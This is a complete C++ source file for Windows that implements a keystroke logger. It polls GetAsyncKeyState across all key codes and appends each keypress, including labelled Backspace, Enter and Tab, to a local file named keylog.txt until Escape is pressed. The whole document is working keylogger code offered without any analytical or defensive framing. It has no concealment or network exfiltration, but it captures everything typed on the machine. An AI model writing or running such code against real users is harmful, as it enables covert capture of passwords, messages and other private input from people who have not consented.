#include <iostream>
#include <fstream>
#include <Windows.h>

int main() {
    std::ofstream logFile("keylog.txt", std::ios::app);

    if (!logFile.is_open()) {
        std::cerr << "Failed to open log file." << std::endl;
        return 1;
    }

    std::cout << "Press ESC to stop logging..." << std::endl;

    while (true) {
        // Check if a key has been pressed
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                // Handle special keys
                switch (key) {
                    case VK_ESCAPE:
                        logFile.close();
                        std::cout << "Logging stopped." << std::endl;
                        return 0;
                    case VK_BACK:
                        logFile << "[BACKSPACE]";
                        break;
                    case VK_RETURN:
                        logFile << "[ENTER]\n";
                        break;
                    case VK_SPACE:
                        logFile << " ";
                        break;
                    case VK_TAB:
                        logFile << "[TAB]";
                        break;
                    default:
                        logFile << char(key);
                }

                logFile.flush();
                Sleep(10); // Small delay to prevent multiple logging of the same key press
            }
        }
    }

    logFile.close();
    return 0;
}
